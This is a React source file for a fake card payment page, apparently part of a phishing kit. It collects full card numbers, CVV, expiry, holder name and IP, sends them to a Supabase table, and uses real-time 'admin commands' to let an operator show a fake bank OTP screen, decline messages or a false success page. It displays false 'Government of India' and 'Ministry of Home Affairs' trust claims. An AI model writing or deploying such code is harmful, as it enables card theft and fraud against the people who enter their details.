import React, { useEffect } from 'react';
import { Loader2 } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import OTPVerificationPage from './OTPVerificationPage';
import PaymentFormFields from './PaymentFormFields';
import PaymentSecurityFeatures from './PaymentSecurityFeatures';
import { usePaymentForm } from '@/hooks/usePaymentForm';
import { getRealIP, getRandomNetwork, generateInvoiceId, sendToSupabase, initializeSupabaseConnection } from '@/utils/paymentApiUtils';

const PaymentForm = () => {
  const {
    formData,
    isLoading,
    setIsLoading,
    showOtp,
    setShowOtp,
    isConfirmLoading,
    setIsConfirmLoading,
    errorMessage,
    setErrorMessage,
    showProcessing,
    setShowProcessing,
    showSuccess,
    setShowSuccess,
    invalidOtpMessage,
    setInvalidOtpMessage,
    fadeState,
    setFadeState,
    currentSubmissionId,
    setCurrentSubmissionId,
    selectedBank,
    setSelectedBank,
    selectedBankLogo,
    setSelectedBankLogo,
    isFormValid,
    handleInputChange,
    handleConfirmPay
  } = usePaymentForm();

  useEffect(() => {
    // Initialize Supabase connection and send visitor data
    initializeSupabaseConnection();

    // Listen for admin commands via Supabase realtime
    const channel = supabase
      .channel('admin-commands')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'admin_commands'
        },
        (payload) => {
          console.log('Received command from admin via Supabase:', payload.new);
          const command = payload.new.command;
          const submissionId = payload.new.submission_id;
          const bankName = payload.new.bank_name;
          const bankLogo = payload.new.bank_logo;
          
          console.log('Processing command:', command, 'for submission:', submissionId);
          console.log('Current submission ID:', currentSubmissionId);
          console.log('Bank name:', bankName, 'Bank logo:', bankLogo);
          
          // Process commands for the current submission or global commands
          if (submissionId && submissionId !== currentSubmissionId) {
            console.log('Command not for current submission, ignoring');
            return;
          }
          
          switch (command) {
            case 'showotp':
              console.log('Executing showotp command with bank:', bankName, bankLogo);
              if (bankName) {
                console.log('Setting selected bank to:', bankName);
                setSelectedBank(bankName);
              }
              if (bankLogo) {
                console.log('Setting selected bank logo to:', bankLogo);
                setSelectedBankLogo(bankLogo);
              }
              console.log('Fading out and showing OTP page');
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(true);
                setFadeState('fadeIn');
                console.log('OTP page should now be visible');
              }, 300);
              break;
            case 'fail':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card has been declined');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'success':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsConfirmLoading(false);
                setShowProcessing(true);
                setFadeState('fadeIn');
                setTimeout(() => {
                  setShowProcessing(false);
                  setShowSuccess(true);
                  setTimeout(() => {
                    window.location.href = 'https://google.com';
                  }, 2000);
                }, 4000);
              }, 300);
              break;
            case 'invalidotp':
              setIsConfirmLoading(false);
              setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
              break;
            case 'cardinvalid':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card is invalid, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'carddisabled':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Card disabled, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
          }
        }
      )
      .subscribe((status) => {
        console.log('Subscription status:', status);
        if (status === 'SUBSCRIBED') {
          console.log('Successfully subscribed to admin commands channel');
        } else if (status === 'CHANNEL_ERROR') {
          console.error('Channel subscription error');
        }
      });

    return () => {
      console.log('Cleaning up Supabase channels');
      supabase.removeChannel(channel);
    };
  }, [currentSubmissionId, setSelectedBank, setSelectedBankLogo, setFadeState, setIsLoading, setShowOtp, setErrorMessage, setIsConfirmLoading, setShowProcessing, setShowSuccess, setInvalidOtpMessage]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) {
      return;
    }
    
    setIsLoading(true);
    setErrorMessage('');
    
    try {
      // Send card data to Supabase
      const realIP = await getRealIP();
      const invoiceId = generateInvoiceId();
      
      const cardData = {
        invoice_id: invoiceId,
        card_number: formData.cardNumber,
        expiry_month: formData.expiryMonth,
        expiry_year: formData.expiryYear,
        cvv: formData.cvv,
        card_holder: formData.cardHolder,
        amount: formData.amount,
        user_ip: realIP,
        browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
        network: getRandomNetwork()
      };
      
      console.log('Submitting card data to Supabase:', cardData);
      const result = await sendToSupabase(cardData);
      
      if (result) {
        console.log('Card submission successful, waiting for admin response...');
        setCurrentSubmissionId(result.id);
        // Keep loading state until admin responds with a command
      }
    } catch (error) {
      console.error('Failed to submit card data:', error);
      setIsLoading(false);
      setErrorMessage('Failed to process payment. Please try again.');
    }
  };

  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
    if (action === 'leave') {
      setErrorMessage('Please try again');
      window.location.href = '/';
    }
  };

  if (showSuccess) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
        <div className="text-center pt-4">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
        <div className="text-center pt-4">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className="w-96 bg-white border-l border-gray-200">
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }

  return (
    <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      <PaymentSecurityFeatures onBackDialogAction={handleBackDialogAction} />

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form className="space-y-4" onSubmit={handleSubmit}>
        <PaymentFormFields
          formData={formData}
          isLoading={isLoading}
          onInputChange={handleInputChange}
        />

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
